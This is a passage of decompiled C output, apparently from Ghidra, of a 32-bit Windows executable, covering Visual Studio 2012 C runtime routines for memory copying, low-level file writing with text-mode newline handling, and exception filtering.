        puVar25[10] = uVar10;
        puVar25[0xb] = uVar11;
        puVar25[0xc] = uVar12;
        puVar25[0xd] = uVar13;
        puVar25[0xe] = uVar14;
        puVar25[0xf] = uVar15;
        uVar26 = *(undefined4 *)((int)_Src + 0x44);
        uVar27 = *(undefined4 *)((int)_Src + 0x48);
        uVar28 = *(undefined4 *)((int)_Src + 0x4c);
        uVar4 = *(undefined4 *)((int)_Src + 0x50);
        uVar5 = *(undefined4 *)((int)_Src + 0x54);
        uVar6 = *(undefined4 *)((int)_Src + 0x58);
        uVar7 = *(undefined4 *)((int)_Src + 0x5c);
        uVar8 = *(undefined4 *)((int)_Src + 0x60);
        uVar9 = *(undefined4 *)((int)_Src + 100);
        uVar10 = *(undefined4 *)((int)_Src + 0x68);
        uVar11 = *(undefined4 *)((int)_Src + 0x6c);
        uVar12 = *(undefined4 *)((int)_Src + 0x70);
        uVar13 = *(undefined4 *)((int)_Src + 0x74);
        uVar14 = *(undefined4 *)((int)_Src + 0x78);
        uVar15 = *(undefined4 *)((int)_Src + 0x7c);
        puVar25[0x10] = *(undefined4 *)((int)_Src + 0x40);
        puVar25[0x11] = uVar26;
        puVar25[0x12] = uVar27;
        puVar25[0x13] = uVar28;
        puVar25[0x14] = uVar4;
        puVar25[0x15] = uVar5;
        puVar25[0x16] = uVar6;
        puVar25[0x17] = uVar7;
        puVar25[0x18] = uVar8;
        puVar25[0x19] = uVar9;
        puVar25[0x1a] = uVar10;
        puVar25[0x1b] = uVar11;
        puVar25[0x1c] = uVar12;
        puVar25[0x1d] = uVar13;
        puVar25[0x1e] = uVar14;
        puVar25[0x1f] = uVar15;
        _Src = (void *)((int)_Src + 0x80);
        puVar25 = puVar25 + 0x20;
      }
      if ((_Size & 0x7f) != 0) {
        for (uVar19 = (_Size & 0x7f) >> 4; uVar19 != 0; uVar19 = uVar19 - 1) {
                    // WARNING: Load size is inaccurate
          uVar26 = *(undefined4 *)((int)_Src + 4);
          uVar27 = *(undefined4 *)((int)_Src + 8);
          uVar28 = *(undefined4 *)((int)_Src + 0xc);
          *puVar25 = *_Src;
          puVar25[1] = uVar26;
          puVar25[2] = uVar27;
          puVar25[3] = uVar28;
          _Src = (void *)((int)_Src + 0x10);
          puVar25 = puVar25 + 4;
        }
        if ((_Size & 0xf) != 0) {
          for (uVar19 = (_Size & 0xf) >> 2; uVar19 != 0; uVar19 = uVar19 - 1) {
                    // WARNING: Load size is inaccurate
            *puVar25 = *_Src;
            _Src = (void *)((int)_Src + 4);
            puVar25 = puVar25 + 1;
          }
          for (uVar19 = _Size & 3; uVar19 != 0; uVar19 = uVar19 - 1) {
                    // WARNING: Load size is inaccurate
            *(undefined *)puVar25 = *_Src;
            _Src = (void *)((int)_Src + 1);
            puVar25 = (undefined4 *)((int)puVar25 + 1);
          }
        }
      }
      return _Dst;
    }
    if ((DAT_0041bbd4 & 1) == 0) goto LAB_0040a46b;
    if (((uint)_Dst & 3) != 0) goto LAB_0040a488;
    if (((uint)_Src & 3) == 0) {
      if (((uint)_Dst >> 2 & 1) != 0) {
                    // WARNING: Load size is inaccurate
        uVar26 = *_Src;
        _Size = _Size - 4;
        _Src = (void *)((int)_Src + 4);
        *(undefined4 *)_Dst = uVar26;
        _Dst = (void *)((int)_Dst + 4);
      }
      if (((uint)_Dst >> 3 & 1) != 0) {
                    // WARNING: Load size is inaccurate
        uVar1 = *_Src;
        _Size = _Size - 8;
        _Src = (void *)((int)_Src + 8);
        *(undefined8 *)_Dst = uVar1;
        _Dst = (void *)((int)_Dst + 8);
      }
      if (((uint)_Src & 7) == 0) {
                    // WARNING: Load size is inaccurate
        puVar17 = (undefined8 *)((int)_Src + -8);
        uVar26 = *_Src;
        uVar27 = *(undefined4 *)((int)_Src + 4);
        do {
          puVar22 = puVar17;
          uVar5 = *(undefined4 *)(puVar22 + 4);
          uVar6 = *(undefined4 *)((int)puVar22 + 0x24);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(puVar22 + 2);
          uVar28 = *(undefined4 *)(puVar22 + 7);
          uVar4 = *(undefined4 *)((int)puVar22 + 0x3c);
          auVar3 = *(undefined (*) [32])(puVar22 + 4);
          *(undefined4 *)((int)_Dst + 8) = uVar26;
          *(undefined4 *)((int)_Dst + 0xc) = uVar27;
          *(undefined4 *)((int)_Dst + 0x10) = uVar5;
          *(undefined4 *)((int)_Dst + 0x14) = uVar6;
          *(undefined (*) [16])((int)_Dst + 0x10) = auVar2._8_16_;
          *(undefined (*) [16])((int)_Dst + 0x20) = auVar3._8_16_;
          _Dst = (void *)((int)_Dst + 0x30);
          puVar17 = puVar22 + 6;
          uVar26 = uVar28;
          uVar27 = uVar4;
        } while (0x2f < (int)_Size);
        puVar22 = puVar22 + 7;
      }
      else if (((uint)_Src >> 3 & 1) == 0) {
                    // WARNING: Load size is inaccurate
        iVar16 = (int)_Src + -4;
        uVar26 = *_Src;
        uVar27 = *(undefined4 *)((int)_Src + 4);
        uVar28 = *(undefined4 *)((int)_Src + 8);
        do {
          iVar21 = iVar16;
          uVar7 = *(undefined4 *)(iVar21 + 0x20);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(iVar21 + 0x10);
          uVar4 = *(undefined4 *)(iVar21 + 0x34);
          uVar5 = *(undefined4 *)(iVar21 + 0x38);
          uVar6 = *(undefined4 *)(iVar21 + 0x3c);
          auVar3 = *(undefined (*) [32])(iVar21 + 0x20);
          *(undefined4 *)((int)_Dst + 4) = uVar26;
          *(undefined4 *)((int)_Dst + 8) = uVar27;
          *(undefined4 *)((int)_Dst + 0xc) = uVar28;
          *(undefined4 *)((int)_Dst + 0x10) = uVar7;
          *(undefined (*) [16])((int)_Dst + 0x10) = auVar2._4_16_;
          *(undefined (*) [16])((int)_Dst + 0x20) = auVar3._4_16_;
          _Dst = (void *)((int)_Dst + 0x30);
          iVar16 = iVar21 + 0x30;
          uVar26 = uVar4;
          uVar27 = uVar5;
          uVar28 = uVar6;
        } while (0x2f < (int)_Size);
        puVar22 = (undefined8 *)(iVar21 + 0x34);
      }
      else {
                    // WARNING: Load size is inaccurate
        iVar16 = (int)_Src + -0xc;
        uVar26 = *_Src;
        do {
          iVar21 = iVar16;
          uVar28 = *(undefined4 *)(iVar21 + 0x20);
          uVar4 = *(undefined4 *)(iVar21 + 0x24);
          uVar5 = *(undefined4 *)(iVar21 + 0x28);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(iVar21 + 0x10);
          uVar27 = *(undefined4 *)(iVar21 + 0x3c);
          auVar3 = *(undefined (*) [32])(iVar21 + 0x20);
          *(undefined4 *)((int)_Dst + 0xc) = uVar26;
          *(undefined4 *)((int)_Dst + 0x10) = uVar28;
          *(undefined4 *)((int)_Dst + 0x14) = uVar4;
          *(undefined4 *)((int)_Dst + 0x18) = uVar5;
          *(undefined (*) [16])((int)_Dst + 0x10) = auVar2._12_16_;
          *(undefined (*) [16])((int)_Dst + 0x20) = auVar3._12_16_;
          _Dst = (void *)((int)_Dst + 0x30);
          iVar16 = iVar21 + 0x30;
          uVar26 = uVar27;
        } while (0x2f < (int)_Size);
        puVar22 = (undefined8 *)(iVar21 + 0x3c);
      }
      for (; 0xf < (int)_Size; _Size = _Size - 0x10) {
        uVar26 = *(undefined4 *)puVar22;
        uVar27 = *(undefined4 *)((int)puVar22 + 4);
        uVar28 = *(undefined4 *)(puVar22 + 1);
        uVar4 = *(undefined4 *)((int)puVar22 + 0xc);
        puVar22 = puVar22 + 2;
        *(undefined4 *)_Dst = uVar26;
        *(undefined4 *)((int)_Dst + 4) = uVar27;
        *(undefined4 *)((int)_Dst + 8) = uVar28;
        *(undefined4 *)((int)_Dst + 0xc) = uVar4;
        _Dst = (void *)((int)_Dst + 0x10);
      }
      if ((_Size >> 2 & 1) != 0) {
        uVar26 = *(undefined4 *)puVar22;
        _Size = _Size - 4;
        puVar22 = (undefined8 *)((int)puVar22 + 4);
        *(undefined4 *)_Dst = uVar26;
        _Dst = (void *)((int)_Dst + 4);
      }
      if ((_Size >> 3 & 1) != 0) {
        _Size = _Size - 8;
        *(undefined8 *)_Dst = *puVar22;
      }
                    // WARNING: Could not recover jumptable at 0x0040a469. Too many branches
                    // WARNING: Treating indirect jump as call
      pvVar18 = (void *)(*(code *)(&switchD_0040a480::switchdataD_0040a598)[_Size])();
      return pvVar18;
    }
LAB_0040a473:
    uVar19 = _Size >> 2;
    uVar20 = _Size & 3;
    if (7 < uVar19) {
                    // WARNING: Load size is inaccurate
      for (; uVar19 != 0; uVar19 = uVar19 - 1) {
        *puVar25 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar25 = puVar25 + 1;
      }
      switch(uVar20) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0040a480_caseD_2;
      case 3:
        goto switchD_0040a480_caseD_3;
      }
      goto switchD_0040a480_caseD_1;
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar19) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar25[uVar19 - 7] = *(undefined4 *)((int)_Src + (uVar19 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar25[uVar19 - 6] = *(undefined4 *)((int)_Src + (uVar19 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar25[uVar19 - 5] = *(undefined4 *)((int)_Src + (uVar19 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar25[uVar19 - 4] = *(undefined4 *)((int)_Src + (uVar19 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar25[uVar19 - 3] = *(undefined4 *)((int)_Src + (uVar19 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar25[uVar19 - 2] = *(undefined4 *)((int)_Src + (uVar19 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar25[uVar19 - 1] = *(undefined4 *)((int)_Src + (uVar19 - 1) * 4);
    _Src = (void *)((int)_Src + uVar19 * 4);
    puVar25 = puVar25 + uVar19;
  }
  switch(uVar20) {
  case 0:
switchD_0040a480_caseD_0:
    return _Dst;
  case 2:
switchD_0040a480_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar25 = *_Src;
    *(undefined *)((int)puVar25 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0040a480_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar25 = *_Src;
    *(undefined *)((int)puVar25 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar25 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_0040a480_caseD_1:
                    // WARNING: Load size is inaccurate
  *(undefined *)puVar25 = *_Src;
  return _Dst;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 __cdecl FUN_0040a8a4(WCHAR *param_1,WCHAR *param_2,WCHAR *param_3)

{
  ulong *puVar1;
  int *piVar2;
  undefined4 uVar3;
  int iVar4;
  
  if (param_1 == (WCHAR *)0xfffffffe) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < (int)param_1) && (param_1 < DAT_0041cf60)) {
      iVar4 = ((uint)param_1 & 0x1f) * 0x40;
      if ((*(byte *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + iVar4) & 1) != 0) {
        ___lock_fhandle((int)param_1);
        if ((*(byte *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + iVar4) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          uVar3 = 0xffffffff;
        }
        else {
          uVar3 = FUN_0040a986(param_1,param_2,param_3);
        }
        FUN_0040a95d();
        return uVar3;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_00407ceb();
  }
  return 0xffffffff;
}



void FUN_0040a95d(void)

{
  int unaff_ESI;
  
  __unlock_fhandle(unaff_ESI);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __cdecl FUN_0040a986(WCHAR *param_1,WCHAR *param_2,WCHAR *param_3)

{
  char cVar1;
  WCHAR WVar2;
  byte bVar3;
  wint_t wVar4;
  ulong *puVar5;
  int *piVar6;
  undefined3 extraout_var;
  _ptiddata p_Var7;
  BOOL BVar8;
  UINT CodePage;
  WCHAR *pWVar9;
  int iVar10;
  WCHAR *pWVar11;
  WCHAR *pWVar12;
  uint uVar13;
  char cVar14;
  int unaff_ESI;
  int iVar15;
  WCHAR *pWVar16;
  WCHAR *pWVar17;
  ushort uVar18;
  DWORD local_1ae8;
  char local_1ae1;
  WCHAR *local_1ae0;
  WCHAR *local_1adc;
  int local_1ad8;
  int local_1ad4;
  WCHAR *local_1ad0;
  WCHAR *local_1acc;
  WCHAR *local_1ac8;
  WCHAR *local_1ac4;
  WCHAR *local_1ac0;
  WCHAR local_1abc [852];
  CHAR local_1414 [3416];
  WCHAR local_6bc [854];
  undefined local_10;
  char local_f;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  pWVar16 = (WCHAR *)0x0;
  local_1ac4 = param_1;
  local_1ac0 = param_2;
  local_1ac8 = (WCHAR *)0x0;
  local_1ad8 = 0;
  if (param_3 == (WCHAR *)0x0) goto LAB_0040b1a3;
  if (param_2 == (WCHAR *)0x0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 0x16;
    FUN_00407ceb();
    goto LAB_0040b1a3;
  }
  local_1ad4 = (int)param_1 >> 5;
  iVar15 = ((uint)param_1 & 0x1f) * 0x40;
  cVar14 = (char)(*(char *)(iVar15 + 0x24 + (&DAT_0041b8c0)[local_1ad4]) * '\x02') >> 1;
  if (((cVar14 == '\x02') || (cVar14 == '\x01')) && ((~(uint)param_3 & 1) == 0)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 0x16;
    FUN_00407ceb();
    goto LAB_0040b1a3;
  }
  if ((*(byte *)(iVar15 + 4 + (&DAT_0041b8c0)[local_1ad4]) & 0x20) != 0) {
    __lseeki64_nolock((int)param_1,0x200000000,unaff_ESI);
  }
  bVar3 = FUN_0040e5f9((uint)local_1ac4);
  pWVar17 = pWVar16;
  if ((CONCAT31(extraout_var,bVar3) == 0) ||
     ((*(byte *)(iVar15 + 4 + (&DAT_0041b8c0)[local_1ad4]) & 0x80) == 0)) {
LAB_0040ad8e:
    if ((*(byte *)(iVar15 + 4 + (&DAT_0041b8c0)[local_1ad4]) & 0x80) == 0) {
      BVar8 = WriteFile(*(HANDLE *)(iVar15 + (&DAT_0041b8c0)[local_1ad4]),local_1ac0,(DWORD)param_3,
                        (LPDWORD)&local_1adc,(LPOVERLAPPED)0x0);
      if (BVar8 == 0) {
LAB_0040b124:
        pWVar11 = (WCHAR *)GetLastError();
        pWVar17 = pWVar16;
      }
      else {
        pWVar11 = (WCHAR *)0x0;
        pWVar17 = local_1adc;
      }
LAB_0040b132:
      if (pWVar17 != (WCHAR *)0x0) goto LAB_0040b1a3;
      goto LAB_0040b136;
    }
    pWVar11 = (WCHAR *)0x0;
    local_1acc = (WCHAR *)0x0;
    if (cVar14 == '\0') {
      local_1ac8 = local_1ac0;
      if (param_3 == (WCHAR *)0x0) goto LAB_0040b15e;
      do {
        pWVar16 = (WCHAR *)((int)local_1ac8 - (int)local_1ac0);
        pWVar9 = local_1abc;
        local_1ac4 = (WCHAR *)0x0;
        do {
          if (param_3 <= pWVar16) break;
          local_1ae1 = *(char *)local_1ac8;
          local_1ac8 = (WCHAR *)((int)local_1ac8 + 1);
          pWVar16 = (WCHAR *)((int)pWVar16 + 1);
          if (local_1ae1 == '\n') {
            local_1ad8 = local_1ad8 + 1;
            *(char *)pWVar9 = '\r';
            pWVar9 = (WCHAR *)((int)pWVar9 + 1);
            local_1ac4 = (WCHAR *)((int)local_1ac4 + 1);
          }
          *(char *)pWVar9 = local_1ae1;
          pWVar9 = (WCHAR *)((int)pWVar9 + 1);
          local_1ac4 = (WCHAR *)((int)local_1ac4 + 1);
        } while (local_1ac4 < (WCHAR *)0x13ff);
        BVar8 = WriteFile(*(HANDLE *)(iVar15 + (&DAT_0041b8c0)[local_1ad4]),local_1abc,
                          (int)pWVar9 - (int)local_1abc,(LPDWORD)&local_1adc,(LPOVERLAPPED)0x0);
        pWVar16 = pWVar17;
        if (BVar8 == 0) goto LAB_0040b124;
        pWVar17 = (WCHAR *)((int)pWVar17 + (int)local_1adc);
      } while (((int)pWVar9 - (int)local_1abc <= (int)local_1adc) &&
              ((WCHAR *)((int)local_1ac8 - (int)local_1ac0) < param_3));
      goto LAB_0040b132;
    }
    if (cVar14 == '\x02') {
      local_1ac4 = local_1ac0;
      if (param_3 != (WCHAR *)0x0) {
        do {
          local_1ae8 = 0;
          pWVar16 = (WCHAR *)((int)local_1ac4 - (int)local_1ac0);
          uVar13 = 0;
          pWVar9 = local_1abc;
          do {
            if (param_3 <= pWVar16) break;
            WVar2 = *local_1ac4;
            local_1ac4 = local_1ac4 + 1;
            pWVar16 = pWVar16 + 1;
            if (WVar2 == L'\n') {
              *pWVar9 = L'\r';
              local_1ad8 = local_1ad8 + 2;
              pWVar9 = pWVar9 + 1;
              uVar13 = uVar13 + 2;
            }
            *pWVar9 = WVar2;
            uVar13 = uVar13 + 2;
            pWVar9 = pWVar9 + 1;
          } while (uVar13 < 0x13fe);
          BVar8 = WriteFile(*(HANDLE *)(iVar15 + (&DAT_0041b8c0)[local_1ad4]),local_1abc,
                            (int)pWVar9 - (int)local_1abc,(LPDWORD)&local_1adc,(LPOVERLAPPED)0x0);
          pWVar16 = local_1ac8;
          if (BVar8 == 0) goto LAB_0040b124;
          local_1ac8 = (WCHAR *)((int)local_1ac8 + (int)local_1adc);
          pWVar11 = local_1acc;
          pWVar17 = local_1ac8;
        } while (((int)pWVar9 - (int)local_1abc <= (int)local_1adc) &&
                ((WCHAR *)((int)local_1ac4 - (int)local_1ac0) < param_3));
        goto LAB_0040b132;
      }
    }
    else {
      local_1ae0 = local_1ac0;
      if (param_3 != (WCHAR *)0x0) {
        do {
          local_1ae8 = 0;
          pWVar17 = (WCHAR *)((int)local_1ae0 - (int)local_1ac0);
          uVar13 = 0;
          pWVar16 = local_6bc;
          do {
            if (param_3 <= pWVar17) break;
            WVar2 = *local_1ae0;
            local_1ae0 = local_1ae0 + 1;
            pWVar17 = pWVar17 + 1;
            if (WVar2 == L'\n') {
              *pWVar16 = L'\r';
              pWVar16 = pWVar16 + 1;
              uVar13 = uVar13 + 2;
            }
            *pWVar16 = WVar2;
            uVar13 = uVar13 + 2;
            pWVar16 = pWVar16 + 1;
          } while (uVar13 < 0x6a8);
          local_1ad0 = (WCHAR *)WideCharToMultiByte(0xfde9,0,local_6bc,
                                                    ((int)pWVar16 - (int)local_6bc) / 2,local_1414,
                                                    0xd55,(LPCSTR)0x0,(LPBOOL)0x0);
          pWVar17 = local_1ac8;
          pWVar11 = local_1acc;
          pWVar16 = local_1ac8;
          if (local_1ad0 == (WCHAR *)0x0) goto LAB_0040b124;
          local_1ac4 = (WCHAR *)0x0;
          do {
            BVar8 = WriteFile(*(HANDLE *)(iVar15 + (&DAT_0041b8c0)[local_1ad4]),
                              local_1414 + (int)local_1ac4,(int)local_1ad0 - (int)local_1ac4,
                              (LPDWORD)&local_1adc,(LPOVERLAPPED)0x0);
            if (BVar8 == 0) {
              pWVar11 = (WCHAR *)GetLastError();
              local_1acc = pWVar11;
              break;
            }
            local_1ac4 = (WCHAR *)((int)local_1ac4 + (int)local_1adc);
          } while ((int)local_1ac4 < (int)local_1ad0);
        } while (((int)local_1ad0 <= (int)local_1ac4) &&
                (local_1ac8 = (WCHAR *)((int)local_1ae0 - (int)local_1ac0), pWVar17 = local_1ac8,
                local_1ac8 < param_3));
        goto LAB_0040b132;
      }
    }
  }
  else {
    p_Var7 = __getptd();
    local_1ac4 = (WCHAR *)(uint)(p_Var7->ptlocinfo->locale_name[2] == (wchar_t *)0x0);
    BVar8 = GetConsoleMode(*(HANDLE *)(iVar15 + (&DAT_0041b8c0)[local_1ad4]),&local_1ae8);
    if ((BVar8 == 0) || ((local_1ac4 != (WCHAR *)0x0 && (cVar14 == '\0')))) goto LAB_0040ad8e;
    CodePage = GetConsoleCP();
    local_1ae0 = (WCHAR *)0x0;
    local_1ad0 = local_1ac0;
    pWVar11 = local_1ac4;
    if (param_3 != (WCHAR *)0x0) {
      pWVar9 = (WCHAR *)0x0;
      local_1acc = (WCHAR *)0x0;
      pWVar12 = local_1ac0;
      do {
        pWVar16 = pWVar17;
        if (cVar14 == '\0') {
          cVar1 = *(char *)pWVar12;
          local_1ac4 = (WCHAR *)(uint)(cVar1 == '\n');
          iVar10 = (&DAT_0041b8c0)[local_1ad4];
          if (*(int *)(iVar15 + 0x38 + iVar10) == 0) {
            iVar10 = _isleadbyte(CONCAT22(cVar1 >> 7,(short)cVar1));
            if (iVar10 == 0) {
              uVar18 = 1;
              pWVar11 = local_1ad0;
              goto LAB_0040abb4;
            }
            if ((uint)(((int)local_1ac0 - (int)local_1ad0) + (int)param_3) < 2) {
              pWVar17 = (WCHAR *)((int)pWVar17 + 1);
              *(undefined *)(iVar15 + 0x34 + (&DAT_0041b8c0)[local_1ad4]) = *(undefined *)local_1ad0
              ;
              *(undefined4 *)(iVar15 + 0x38 + (&DAT_0041b8c0)[local_1ad4]) = 1;
              pWVar11 = local_1ac4;
              break;
            }
            iVar10 = _mbtowc((wchar_t *)&local_1ac8,(char *)local_1ad0,2);
            pWVar11 = local_1ac4;
            if (iVar10 == -1) break;
            local_1ad0 = (WCHAR *)((int)local_1ad0 + 1);
            local_1acc = (WCHAR *)((int)local_1acc + 1);
          }
          else {
            local_10 = *(undefined *)(iVar15 + 0x34 + iVar10);
            uVar18 = 2;
            *(undefined4 *)(iVar15 + 0x38 + iVar10) = 0;
            pWVar11 = (WCHAR *)&local_10;
            local_f = cVar1;
LAB_0040abb4:
            iVar10 = _mbtowc((wchar_t *)&local_1ac8,(char *)pWVar11,(uint)uVar18);
            pWVar11 = local_1ac4;
            if (iVar10 == -1) break;
          }
          local_1ad0 = (WCHAR *)((int)local_1ad0 + 1);
          local_1acc = (WCHAR *)((int)local_1acc + 1);
          local_1ae8 = WideCharToMultiByte(CodePage,0,(LPCWSTR)&local_1ac8,1,&local_10,5,(LPCSTR)0x0
                                           ,(LPBOOL)0x0);
          pWVar11 = local_1ac4;
          if (local_1ae8 == 0) break;
          BVar8 = WriteFile(*(HANDLE *)(iVar15 + (&DAT_0041b8c0)[local_1ad4]),&local_10,local_1ae8,
                            (LPDWORD)&local_1ae0,(LPOVERLAPPED)0x0);
          if (BVar8 == 0) goto LAB_0040b124;
          pWVar17 = (WCHAR *)((int)local_1acc + local_1ad8);
          pWVar11 = local_1ac4;
          if ((int)local_1ae0 < (int)local_1ae8) break;
          pWVar9 = local_1acc;
          pWVar12 = local_1ad0;
          pWVar16 = pWVar17;
          if (local_1ac4 != (WCHAR *)0x0) {
            local_10 = 0xd;
            BVar8 = WriteFile(*(HANDLE *)(iVar15 + (&DAT_0041b8c0)[local_1ad4]),&local_10,1,
                              (LPDWORD)&local_1ae0,(LPOVERLAPPED)0x0);
            if (BVar8 == 0) goto LAB_0040b124;
            pWVar11 = local_1ac4;
            if ((int)local_1ae0 < 1) break;
            local_1ad8 = local_1ad8 + 1;
            pWVar9 = local_1acc;
            pWVar12 = local_1ad0;
            pWVar16 = (WCHAR *)((int)pWVar17 + 1);
          }
        }
        else {
          if ((cVar14 == '\x01') || (cVar14 == '\x02')) {
            local_1ac8 = (WCHAR *)(uint)(ushort)*pWVar12;
            local_1ac4 = (WCHAR *)(uint)(*pWVar12 == L'\n');
            pWVar12 = pWVar12 + 1;
            pWVar9 = local_1acc + 1;
            local_1ad0 = pWVar12;
            local_1acc = pWVar9;
          }
          if ((cVar14 == '\x01') || (cVar14 == '\x02')) {
            wVar4 = __putwch_nolock((wchar_t)local_1ac8);
            if (wVar4 != (wint_t)local_1ac8) goto LAB_0040b124;
            pWVar9 = local_1acc;
            pWVar12 = local_1ad0;
            pWVar16 = pWVar17 + 1;
            if (local_1ac4 != (WCHAR *)0x0) {
              local_1ac8 = (WCHAR *)0xd;
              wVar4 = __putwch_nolock(L'\r');
              if (wVar4 != (wint_t)local_1ac8) goto LAB_0040b124;
              local_1ad8 = local_1ad8 + 1;
              pWVar9 = local_1acc;
              pWVar12 = local_1ad0;
              pWVar16 = (WCHAR *)((int)pWVar17 + 3);
            }
          }
        }
        pWVar17 = pWVar16;
        pWVar11 = local_1ac4;
      } while (pWVar9 < param_3);
      goto LAB_0040b132;
    }
LAB_0040b136:
    if (pWVar11 != (WCHAR *)0x0) {
      if (pWVar11 == (WCHAR *)0x5) {
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        FID_conflict___dosmaperr((ulong)pWVar11);
      }
      goto LAB_0040b1a3;
    }
  }
LAB_0040b15e:
  if (((*(byte *)(iVar15 + 4 + (&DAT_0041b8c0)[local_1ad4]) & 0x40) == 0) ||
     (*(char *)local_1ac0 != '\x1a')) {
    piVar6 = __errno();
    *piVar6 = 0x1c;
    puVar5 = ___doserrno();
    *puVar5 = 0;
  }
LAB_0040b1a3:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
// 
// Library: Visual Studio 2012 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  code *pcVar3;
  long lVar4;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
    pcVar3 = (code *)swi(3);
    lVar4 = (*pcVar3)();
    return lVar4;
  }
  return 0;
}



// Library Function - Single Match
//  __XcptFilter
// 
// Library: Visual Studio 2012 Release

int __cdecl __XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  ulong *puVar1;
  code *pcVar2;
  void *pvVar3;
  _ptiddata p_Var4;
  ulong *puVar5;
  int iVar6;
  int iVar7;
  
  p_Var4 = __getptd_noexit();
  if (p_Var4 != (_ptiddata)0x0) {
    puVar1 = (ulong *)p_Var4->_pxcptacttab;
    puVar5 = puVar1;
    do {
      if (*puVar5 == _ExceptionNum) break;
      puVar5 = puVar5 + 3;
    } while (puVar5 < puVar1 + 0x24);
    if ((puVar1 + 0x24 <= puVar5) || (*puVar5 != _ExceptionNum)) {
      puVar5 = (ulong *)0x0;
    }
    if ((puVar5 == (ulong *)0x0) || (pcVar2 = (code *)puVar5[2], pcVar2 == (code *)0x0)) {
      p_Var4 = (_ptiddata)0x0;
    }
    else if (pcVar2 == (code *)0x5) {
      puVar5[2] = 0;
      p_Var4 = (_ptiddata)0x1;
    }
    else if (pcVar2 == (code *)0x1) {
      p_Var4 = (_ptiddata)0xffffffff;
    }
    else {
      pvVar3 = p_Var4->_tpxcptinfoptrs;
      p_Var4->_tpxcptinfoptrs = _ExceptionPtr;
      if (puVar5[1] == 8) {
        iVar6 = 0x24;
        do {
          iVar7 = iVar6 + 0xc;
          *(undefined4 *)(iVar6 + 8 + (int)p_Var4->_pxcptacttab) = 0;
          iVar6 = iVar7;
        } while (iVar7 < 0x90);
        iVar6 = p_Var4->_tfpecode;
        if (*puVar5 == 0xc000008e) {
          p_Var4->_tfpecode = 0x83;
        }
        else if (*puVar5 == 0xc0000090) {
          p_Var4->_tfpecode = 0x81;
        }
        else if (*puVar5 == 0xc0000091) {
          p_Var4->_tfpecode = 0x84;
        }
        else if (*puVar5 == 0xc0000093) {
          p_Var4->_tfpecode = 0x85;
        }
        else if (*puVar5 == 0xc000008d) {
          p_Var4->_tfpecode = 0x82;
        }
        else if (*puVar5 == 0xc000008f) {
          p_Var4->_tfpecode = 0x86;
        }
        else if (*puVar5 == 0xc0000092) {
          p_Var4->_tfpecode = 0x8a;
        }
        else if (*puVar5 == 0xc00002b5) {
          p_Var4->_tfpecode = 0x8d;
        }
        else if (*puVar5 == 0xc00002b4) {
          p_Var4->_tfpecode = 0x8e;
        }
        (*pcVar2)(8,p_Var4->_tfpecode);
        p_Var4->_tfpecode = iVar6;
      }
      else {
        puVar5[2] = 0;
        (*pcVar2)(puVar5[1]);
      }
      p_Var4->_tpxcptinfoptrs = pvVar3;
      p_Var4 = (_ptiddata)0xffffffff;
    }
  }
  return (int)p_Var4;
}



void FUN_0040b47c(void)

{
  FUN_0040ed0f(0xd);
  return;
}



void FUN_0040b488(void)

{
  FUN_0040ed0f(0xc);
  return;
}



// Library Function - Single Match
//  __getptd
// 
// Library: Visual Studio 2012 Release

_ptiddata __cdecl __getptd(void)

{
